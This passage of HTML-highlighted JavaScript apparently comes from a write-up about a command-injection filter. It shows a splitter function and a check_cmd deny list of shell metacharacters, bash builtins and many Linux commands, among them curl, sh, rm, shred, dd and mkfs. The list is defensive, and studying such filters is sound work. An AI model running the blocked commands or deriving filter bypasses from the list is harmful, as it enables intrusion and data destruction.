class="string">&quot;$&quot;</span>, <span class="string">&quot;;&quot;</span>]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">resultArray</span> = [];</span><br><span class="line">    let currentPart = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; input.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">currentChar</span> = input[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (blackchr.<span class="title function_ invoke__">includes</span>(currentChar)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (currentPart.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                resultArray.<span class="title function_ invoke__">push</span>(currentPart);</span><br><span class="line">                currentPart = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            currentPart += currentChar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (currentPart.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        resultArray.<span class="title function_ invoke__">push</span>(currentPart);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resultArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_cmd</span>(<span class="params">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">command</span> = [<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&lt;&gt;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;if&quot;</span>, <span class="string">&quot;then&quot;</span>, <span class="string">&quot;else&quot;</span>, <span class="string">&quot;elif&quot;</span>, <span class="string">&quot;fi&quot;</span>, <span class="string">&quot;case&quot;</span>, <span class="string">&quot;esac&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;until&quot;</span>, <span class="string">&quot;do&quot;</span>, <span class="string">&quot;done&quot;</span>, <span class="string">&quot;in&quot;</span>, <span class="string">&quot;function&quot;</span>, <span class="string">&quot;time&quot;</span>, <span class="string">&quot;coproc&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;bind&quot;</span>, <span class="string">&quot;break&quot;</span>, <span class="string">&quot;builtin&quot;</span>, <span class="string">&quot;caller&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;compgen&quot;</span>, <span class="string">&quot;complete&quot;</span>, <span class="string">&quot;compopt&quot;</span>, <span class="string">&quot;continue&quot;</span>, <span class="string">&quot;declare&quot;</span>, <span class="string">&quot;dirs&quot;</span>, <span class="string">&quot;disown&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;enable&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;export&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;help&quot;</span>, <span class="string">&quot;history&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;let&quot;</span>, <span class="string">&quot;local&quot;</span>, <span class="string">&quot;logout&quot;</span>, <span class="string">&quot;mapfile&quot;</span>, <span class="string">&quot;popd&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;pushd&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;readarray&quot;</span>, <span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;return&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;shift&quot;</span>, <span class="string">&quot;shopt&quot;</span>, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;suspend&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;times&quot;</span>, <span class="string">&quot;trap&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;typeset&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;unset&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;vipw&quot;</span>, <span class="string">&quot;mkdumprd&quot;</span>, <span class="string">&quot;ifenslave&quot;</span>, <span class="string">&quot;fsck&quot;</span>, <span class="string">&quot;chpasswd&quot;</span>, <span class="string">&quot;useradd&quot;</span>, <span class="string">&quot;rtstat&quot;</span>, <span class="string">&quot;lnstat&quot;</span>, <span class="string">&quot;hwclock&quot;</span>, <span class="string">&quot;dhclient&quot;</span>, <span class="string">&quot;pwunconv&quot;</span>, <span class="string">&quot;groupmems&quot;</span>, <span class="string">&quot;mksquashfs&quot;</span>, <span class="string">&quot;chkconfig&quot;</span>, <span class="string">&quot;ethtool&quot;</span>, <span class="string">&quot;packer&quot;</span>, <span class="string">&quot;mkdict&quot;</span>, <span class="string">&quot;agetty&quot;</span>, <span class="string">&quot;applygnupgdefaults&quot;</span>, <span class="string">&quot;zramctl&quot;</span>, <span class="string">&quot;swaplabel&quot;</span>, <span class="string">&quot;blkzone&quot;</span>, <span class="string">&quot;pwconv&quot;</span>, <span class="string">&quot;cfdisk&quot;</span>, <span class="string">&quot;ldattach&quot;</span>, <span class="string">&quot;reboot&quot;</span>, <span class="string">&quot;tipc&quot;</span>, <span class="string">&quot;fstrim&quot;</span>, <span class="string">&quot;clockdiff&quot;</span>, <span class="string">&quot;groupadd&quot;</span>, <span class="string">&quot;dmfilemapd&quot;</span>, <span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;modinfo&quot;</span>, <span class="string">&quot;swapoff&quot;</span>, <span class="string">&quot;telinit&quot;</span>, <span class="string">&quot;sfdisk&quot;</span>, <span class="string">&quot;ctstat&quot;</span>, <span class="string">&quot;clock&quot;</span>, <span class="string">&quot;rtpr&quot;</span>, <span class="string">&quot;fsfreeze&quot;</span>, <span class="string">&quot;ldconfig&quot;</span>, <span class="string">&quot;fdformat&quot;</span>, <span class="string">&quot;getcap&quot;</span>, <span class="string">&quot;kexec&quot;</span>, <span class="string">&quot;rdma&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;rtmon&quot;</span>, <span class="string">&quot;rtacct&quot;</span>, <span class="string">&quot;fdisk&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;usermod&quot;</span>, <span class="string">&quot;findfs&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="string">&quot;resizepart&quot;</span>, <span class="string">&quot;routef&quot;</span>, <span class="string">&quot;genl&quot;</span>, <span class="string">&quot;mkswap&quot;</span>, <span class="string">&quot;poweroff&quot;</span>, <span class="string">&quot;rdisc&quot;</span>, <span class="string">&quot;grpunconv&quot;</span>, <span class="string">&quot;partx&quot;</span>, <span class="string">&quot;rtcwake&quot;</span>, <span class="string">&quot;nologin&quot;</span>, <span class="string">&quot;rfkill&quot;</span>, <span class="string">&quot;lspci&quot;</span>, <span class="string">&quot;vigr&quot;</span>, <span class="string">&quot;grpconv&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;blkdeactivate&quot;</span>, <span class="string">&quot;addgnupghome&quot;</span>, <span class="string">&quot;chroot&quot;</span>, <span class="string">&quot;shutdown&quot;</span>, <span class="string">&quot;unsquashfs&quot;</span>, <span class="string">&quot;readprofile&quot;</span>, <span class="string">&quot;adduser&quot;</span>, <span class="string">&quot;groupmod&quot;</span>, <span class="string">&quot;ss&quot;</span>, <span class="string">&quot;dmstats&quot;</span>, <span class="string">&quot;ifcfg&quot;</span>, <span class="string">&quot;modprobe&quot;</span>, <span class="string">&quot;depmod&quot;</span>, <span class="string">&quot;iconvconfig&quot;</span>, <span class="string">&quot;sulogin&quot;</span>, <span class="string">&quot;rmmod&quot;</span>, <span class="string">&quot;grpck&quot;</span>, <span class="string">&quot;nstat&quot;</span>, <span class="string">&quot;ifstat&quot;</span>, <span class="string">&quot;sysctl&quot;</span>, <span class="string">&quot;insmod&quot;</span>, <span class="string">&quot;routel&quot;</span>, <span class="string">&quot;zdump&quot;</span>, <span class="string">&quot;blkdiscard&quot;</span>, <span class="string">&quot;getpcaps&quot;</span>, <span class="string">&quot;losetup&quot;</span>, <span class="string">&quot;setpci&quot;</span>, <span class="string">&quot;dmsetup&quot;</span>, <span class="string">&quot;wipefs&quot;</span>, <span class="string">&quot;addpart&quot;</span>, <span class="string">&quot;zic&quot;</span>, <span class="string">&quot;userdel&quot;</span>, <span class="string">&quot;makedumpfile&quot;</span>, <span class="string">&quot;blkid&quot;</span>, <span class="string">&quot;groupdel&quot;</span>, <span class="string">&quot;setcap&quot;</span>, <span class="string">&quot;chgpasswd&quot;</span>, <span class="string">&quot;resolvconf&quot;</span>, <span class="string">&quot;newusers&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;arping&quot;</span>, <span class="string">&quot;pwck&quot;</span>, <span class="string">&quot;devlink&quot;</span>, <span class="string">&quot;lsmod&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;mkfs&quot;</span>, <span class="string">&quot;faillock&quot;</span>, <span class="string">&quot;runlevel&quot;</span>, <span class="string">&quot;blockdev&quot;</span>, <span class="string">&quot;swapon&quot;</span>, <span class="string">&quot;alternatives&quot;</span>, <span class="string">&quot;arpd&quot;</span>, <span class="string">&quot;delpart&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;chcpu&quot;</span>, <span class="string">&quot;capsh&quot;</span>, <span class="string">&quot;ctrlaltdel&quot;</span>, <span class="string">&quot;bridge&quot;</span>, <span class="string">&quot;less&quot;</span>, <span class="string">&quot;gpgsplit&quot;</span>, <span class="string">&quot;pgrep&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;localedef&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;gencat&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;ptx&quot;</span>, <span class="string">&quot;nm&quot;</span>, <span class="string">&quot;pwmake&quot;</span>, <span class="string">&quot;zmore&quot;</span>, <span class="string">&quot;tzselect&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;dnsdomainname&quot;</span>, <span class="string">&quot;ar&quot;</span>, <span class="string">&quot;more&quot;</span>, <span class="string">&quot;journalctl&quot;</span>, <span class="string">&quot;gunzip&quot;</span>, <span class="string">&quot;makedb&quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;col&quot;</span>, <span class="string">&quot;sync&quot;</span>, <span class="string">&quot;vi&quot;</span>, <span class="string">&quot;locale&quot;</span>, <span class="string">&quot;prlimit&quot;</span>, <span class="string">&quot;nisdomainname&quot;</span>, <span class="string">&quot;timedatectl&quot;</span>, <span class="string">&quot;ipcmk&quot;</span>, <span class="string">&quot;isosize&quot;</span>, <span class="string">&quot;free&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;taskset&quot;</span>, <span class="string">&quot;factor&quot;</span>, <span class="string">&quot;pinky&quot;</span>, <span class="string">&quot;arch&quot;</span>, <span class="string">&quot;lscpu&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;tty&quot;</span>, <span class="string">&quot;xmllint&quot;</span>, <span class="string">&quot;xzcmp&quot;</span>, <span class="string">&quot;readelf&quot;</span>, <span class="string">&quot;kdumpctl&quot;</span>, <span class="string">&quot;tsort&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;cal&quot;</span>, <span class="string">&quot;rpmdb&quot;</span>, <span class="string">&quot;newgrp&quot;</span>, <span class="string">&quot;xmlwf&quot;</span>, <span class="string">&quot;slabtop&quot;</span>, <span class="string">&quot;utmpdump&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;basename&quot;</span>, <span class="string">&quot;eject&quot;</span>, <span class="string">&quot;ranlib&quot;</span>, <span class="string">&quot;wall&quot;</span>, <span class="string">&quot;zless&quot;</span>, <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;nsenter&quot;</span>, <span class="string">&quot;getent&quot;</span>, <span class="string">&quot;chrt&quot;</span>, <span class="string">&quot;mount&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;systemctl&quot;</span>, <span class="string">&quot;vmstat&quot;</span>, <span class="string">&quot;xmlcatalog&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;lsinitrd&quot;</span>, <span class="string">&quot;tload&quot;</span>, <span class="string">&quot;chmod&quot;</span>, <span class="string">&quot;setsid&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;colcrt&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;lsipc&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;lsns&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;lastb&quot;</span>, <span class="string">&quot;df&quot;</span>, <span class="string">&quot;gpg&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;gpgv&quot;</span>, <span class="string">&quot;pathchk&quot;</span>, <span class="string">&quot;groups&quot;</span>, <span class="string">&quot;lsmem&quot;</span>, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;as&quot;</span>, <span class="string">&quot;ipcs&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;iconv&quot;</span>, <span class="string">&quot;dwp&quot;</span>, <span class="string">&quot;domainname&quot;</span>, <span class="string">&quot;xzcat&quot;</span>, <span class="string">&quot;ldd&quot;</span>, <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;strip&quot;</span>, <span class="string">&quot;dircolors&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;trust&quot;</span>, <span class="string">&quot;stty&quot;</span>, <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;chacl&quot;</span>, <span class="string">&quot;loginctl&quot;</span>, <span class="string">&quot;gzip&quot;</span>, <span class="string">&quot;xzmore&quot;</span>, <span class="string">&quot;zcat&quot;</span>, <span class="string">&quot;busctl&quot;</span>, <span class="string">&quot;fincore&quot;</span>, <span class="string">&quot;fgrep&quot;</span>, <span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;mv&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;lslogins&quot;</span>, <span class="string">&quot;numfmt&quot;</span>, <span class="string">&quot;flock&quot;</span>, <span class="string">&quot;realpath&quot;</span>, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;lesskey&quot;</span>, <span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;du&quot;</span>, <span class="string">&quot;grep&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;tee&quot;</span>, <span class="string">&quot;rename&quot;</span>, <span class="string">&quot;gawk&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;sg&quot;</span>, <span class="string">&quot;xzegrep&quot;</span>, <span class="string">&quot;xzdec&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;whereis&quot;</span>, <span class="string">&quot;strings&quot;</span>, <span class="string">&quot;setfacl&quot;</span>, <span class="string">&quot;mkfifo&quot;</span>, <span class="string">&quot;chage&quot;</span>, <span class="string">&quot;xzgrep&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;rvi&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;ypdomainname&quot;</span>, <span class="string">&quot;tr&quot;</span>, <span class="string">&quot;umount&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;wdctl&quot;</span>, <span class="string">&quot;uniq&quot;</span>, <span class="string">&quot;ps&quot;</span>, <span class="string">&quot;stdbuf&quot;</span>, <span class="string">&quot;chgrp&quot;</span>, <span class="string">&quot;setarch&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;dirmngr&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;lastlog&quot;</span>, <span class="string">&quot;gsettings&quot;</span>, <span class="string">&quot;ex&quot;</span>, <span class="string">&quot;ipcrm&quot;</span>, <span class="string">&quot;cp&quot;</span>, <span class="string">&quot;fallocate&quot;</span>, <span class="string">&quot;colrm&quot;</span>, <span class="string">&quot;rpm&quot;</span>, <span class="string">&quot;pwdx&quot;</span>, <span class="string">&quot;xargs&quot;</span>, <span class="string">&quot;objdump&quot;</span>, <span class="string">&quot;ld&quot;</span>, <span class="string">&quot;chcon&quot;</span>, <span class="string">&quot;skill&quot;</span>, <span class="string">&quot;yum&quot;</span>, <span class="string">&quot;who&quot;</span>, <span class="string">&quot;gapplication&quot;</span>, <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;uuidgen&quot;</span>, <span class="string">&quot;logger&quot;</span>, <span class="string">&quot;pwscore&quot;</span>, <span class="string">&quot;xz&quot;</span>, <span class="string">&quot;mesg&quot;</span>, <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;zgrep&quot;</span>, <span class="string">&quot;chmem&quot;</span>, <span class="string">&quot;newuidmap&quot;</span>, <span class="string">&quot;evmctl&quot;</span>, <span class="string">&quot;wc&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;egrep&quot;</span>, <span class="string">&quot;fold&quot;</span>, <span class="string">&quot;zfgrep&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;csplit&quot;</span>, <span class="string">&quot;sum&quot;</span>, <span class="string">&quot;expand&quot;</span>, <span class="string">&quot;getfacl&quot;</span>, <span class="string">&quot;newgidmap&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;install&quot;</span>, <span class="string">&quot;bootctl&quot;</span>, <span class="string">&quot;xzless&quot;</span>, <span class="string">&quot;runcon&quot;</span>, <span class="string">&quot;dirname&quot;</span>, <span class="string">&quot;comm&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;hostname&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;ipcalc&quot;</span>, <span class="string">&quot;unexpand&quot;</span>, <span class="string">&quot;nohup&quot;</span>, <span class="string">&quot;zegrep&quot;</span>, <span class="string">&quot;head&quot;</span>, <span class="string">&quot;getopt&quot;</span>, <span class="string">&quot;raw&quot;</span>, <span class="string">&quot;hexdump&quot;</span>, <span class="string">&quot;mountpoint&quot;</span>, <span class="string">&quot;lslocks&quot;</span>, <span class="string">&quot;coreutils&quot;</span>, <span class="string">&quot;shred&quot;</span>, <span class="string">&quot;sotruss&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;pldd&quot;</span>, <span class="string">&quot;uuidparse&quot;</span>, <span class="string">&quot;localectl&quot;</span>, <span class="string">&quot;gtar&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;znew&quot;</span>, <span class="string">&quot;logname&quot;</span>, <span class="string">&quot;gzexe&quot;</span>, <span class="string">&quot;rpmquery&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;cpio&quot;</span>, <span class="string">&quot;sprof&quot;</span>, <span class="string">&quot;hostnamectl&quot;</span>, <span class="string">&quot;uname&quot;</span>, <span class="string">&quot;unxz&quot;</span>, <span class="string">&quot;zdiff&quot;</span>, <span class="string">&quot;gdbus&quot;</span>, <span class="string">&quot;namei&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;kmod&quot;</span>, <span class="string">&quot;info&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;zcmp&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;mktemp&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;column&quot;</span>, <span class="string">&quot;scriptreplay&quot;</span>, <span class="string">&quot;lessecho&quot;</span>, <span class="string">&quot;look&quot;</span>, <span class="string">&quot;setterm&quot;</span>, <span class="string">&quot;gdbmtool&quot;</span>, <span class="string">&quot;rpmkeys&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;gpasswd&quot;</span>, <span class="string">&quot;dracut&quot;</span>, <span class="string">&quot;vdir&quot;</span>, <span class="string">&quot;mcookie&quot;</span>, <span class="string">&quot;elfedit&quot;</span>, <span class="string">&quot;chown&quot;</span>, <span class="string">&quot;objcopy&quot;</span>, <span class="string">&quot;hostid&quot;</span>, <span class="string">&quot;shuf&quot;</span>, <span class="string">&quot;view&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;gpgparsemail&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;tail&quot;</span>, <span class="string">&quot;zforce&quot;</span>, <span class="string">&quot;last&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;ionice&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;resolvectl&quot;</span>, <span class="string">&quot;watchgnupg&quot;</span>, <span class="string">&quot;unshare&quot;</span>, <span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;getconf&quot;</span>, <span class="string">&quot;findmnt&quot;</span>, <span class="string">&quot;pr&quot;</span>, <span class="string">&quot;xzfgrep&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;rview&quot;</span>, <span class="string">&quot;fmt&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;paste&quot;</span>, <span class="string">&quot;od&quot;</span>, <span class="string">&quot;setpriv&quot;</span>, <span class="string">&quot;coredumpctl&quot;</span>, <span class="string">&quot;dnf&quot;</span>, <span class="string">&quot;xzdiff&quot;</span>, <span class="string">&quot;renicerpmverify&quot;</span>, <span class="string">&quot;pkill&quot;</span>, <span class="string">&quot;mkinitrd&quot;</span>, <span class="string">&quot;pmap&quot;</span>, <span class="string">&quot;snice&quot;</span>, <span class="string">&quot;gio&quot;</span>, <span class="string">&quot;gpgconf&quot;</span>, <span class="string">&quot;expr&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;nproc&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;cksum&quot;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&quot;rpmverify&quot;</span>, <span class="string">&quot;lsblk&quot;</span>, <span class="string">&quot;catchsegv&quot;</span>, <span class="string">&quot;uptime&quot;</span>, <span class="string">&quot;seq&quot;</span>, <span class="string">&quot;ln&quot;</span>, <span class="string">&quot;cut&quot;</span>, <span class="string">&quot;bashbug&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;gprof&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;npm&quot;</span>, <span class="string">&quot;corepack&quot;</span>, <span class="string">&quot;npx&quot;</span>, <span class="string">&quot;vipw&quot;</span>, <span class="string">&quot;mkdumprd&quot;</span>, <span class="string">&quot;ifenslave&quot;</span>, <span class="string">&quot;fsck&quot;</span>, <span class="string">&quot;chpasswd&quot;</span>, <span class="string">&quot;useradd&quot;</span>, <span class="string">&quot;rtstat&quot;</span>, <span class="string">&quot;lnstat&quot;</span>, <span class="string">&quot;hwclock&quot;</span>, <span class="string">&quot;dhclient&quot;</span>, <span class="string">&quot;pwunconv&quot;</span>, <span class="string">&quot;groupmems&quot;</span>, <span class="string">&quot;mksquashfs&quot;</span>, <span class="string">&quot;chkconfig&quot;</span>, <span class="string">&quot;ethtool&quot;</span>, <span class="string">&quot;packer&quot;</span>, <span class="string">&quot;mkdict&quot;</span>, <span class="string">&quot;agetty&quot;</span>, <span class="string">&quot;applygnupgdefaults&quot;</span>, <span class="string">&quot;zramctl&quot;</span>, <span class="string">&quot;swaplabel&quot;</span>, <span class="string">&quot;blkzone&quot;</span>, <span class="string">&quot;pwconv&quot;</span>, <span class="string">&quot;cfdisk&quot;</span>, <span class="string">&quot;ldattach&quot;</span>, <span class="string">&quot;reboot&quot;</span>, <span class="string">&quot;tipc&quot;</span>, <span class="string">&quot;fstrim&quot;</span>, <span class="string">&quot;clockdiff&quot;</span>, <span class="string">&quot;groupadd&quot;</span>, <span class="string">&quot;dmfilemapd&quot;</span>, <span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;modinfo&quot;</span>, <span class="string">&quot;swapoff&quot;</span>, <span class="string">&quot;telinit&quot;</span>, <span class="string">&quot;sfdisk&quot;</span>, <span class="string">&quot;ctstat&quot;</span>, <span class="string">&quot;clock&quot;</span>, <span class="string">&quot;rtpr&quot;</span>, <span class="string">&quot;fsfreeze&quot;</span>, <span class="string">&quot;ldconfig&quot;</span>, <span class="string">&quot;fdformat&quot;</span>, <span class="string">&quot;getcap&quot;</span>, <span class="string">&quot;kexec&quot;</span>, <span class="string">&quot;rdma&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;rtmon&quot;</span>, <span class="string">&quot;rtacct&quot;</span>, <span class="string">&quot;fdisk&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;usermod&quot;</span>, <span class="string">&quot;findfs&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="string">&quot;resizepart&quot;</span>, <span class="string">&quot;routef&quot;</span>, <span class="string">&quot;genl&quot;</span>, <span class="string">&quot;mkswap&quot;</span>, <span class="string">&quot;poweroff&quot;</span>, <span class="string">&quot;rdisc&quot;</span>, <span class="string">&quot;grpunconv&quot;</span>, <span class="string">&quot;partx&quot;</span>, <span class="string">&quot;rtcwake&quot;</span>, <span class="string">&quot;nologin&quot;</span>, <span class="string">&quot;rfkill&quot;</span>, <span class="string">&quot;lspci&quot;</span>, <span class="string">&quot;vigr&quot;</span>, <span class="string">&quot;grpconv&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;blkdeactivate&quot;</span>, <span class="string">&quot;addgnupghome&quot;</span>, <span class="string">&quot;chroot&quot;</span>, <span class="string">&quot;shutdown&quot;</span>, <span class="string">&quot;unsquashfs&quot;</span>, <span class="string">&quot;readprofile&quot;</span>, <span class="string">&quot;adduser&quot;</span>, <span class="string">&quot;groupmod&quot;</span>, <span class="string">&quot;ss&quot;</span>, <span class="string">&quot;dmstats&quot;</span>, <span class="string">&quot;ifcfg&quot;</span>, <span class="string">&quot;modprobe&quot;</span>, <span class="string">&quot;depmod&quot;</span>, <span class="string">&quot;iconvconfig&quot;</span>, <span class="string">&quot;sulogin&quot;</span>, <span class="string">&quot;rmmod&quot;</span>, <span class="string">&quot;grpck&quot;</span>, <span class="string">&quot;nstat&quot;</span>, <span class="string">&quot;ifstat&quot;</span>, <span class="string">&quot;sysctl&quot;</span>, <span class="string">&quot;insmod&quot;</span>, <span class="string">&quot;routel&quot;</span>, <span class="string">&quot;zdump&quot;</span>, <span class="string">&quot;blkdiscard&quot;</span>, <span class="string">&quot;getpcaps&quot;</span>, <span class="string">&quot;losetup&quot;</span>, <span class="string">&quot;setpci&quot;</span>, <span class="string">&quot;dmsetup&quot;</span>, <span class="string">&quot;wipefs&quot;</span>, <span class="string">&quot;addpart&quot;</span>, <span class="string">&quot;zic&quot;</span>, <span class="string">&quot;userdel&quot;</span>, <span class="string">&quot;makedumpfile&quot;</span>, <span class="string">&quot;blkid&quot;</span>, <span class="string">&quot;groupdel&quot;</span>, <span class="string">&quot;setcap&quot;</span>, <span class="string">&quot;chgpasswd&quot;</span>, <span class="string">&quot;resolvconf&quot;</span>, <span class="string">&quot;newusers&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;arping&quot;</span>, <span class="string">&quot;pwck&quot;</span>, <span class="string">&quot;devlink&quot;</span>, <span class="string">&quot;lsmod&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;mkfs&quot;</span>, <span class="string">&quot;faillock&quot;</span>, <span class="string">&quot;runlevel&quot;</span>, <span class="string">&quot;blockdev&quot;</span>, <span class="string">&quot;swapon&quot;</span>, <span class="string">&quot;alternatives&quot;</span>, <span class="string">&quot;arpd&quot;</span>, <span class="string">&quot;delpart&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;chcpu&quot;</span>, <span class="string">&quot;capsh&quot;</span>, <span class="string">&quot;ctrlaltdel&quot;</span>, <span class="string">&quot;bridge&quot;</span>, <span 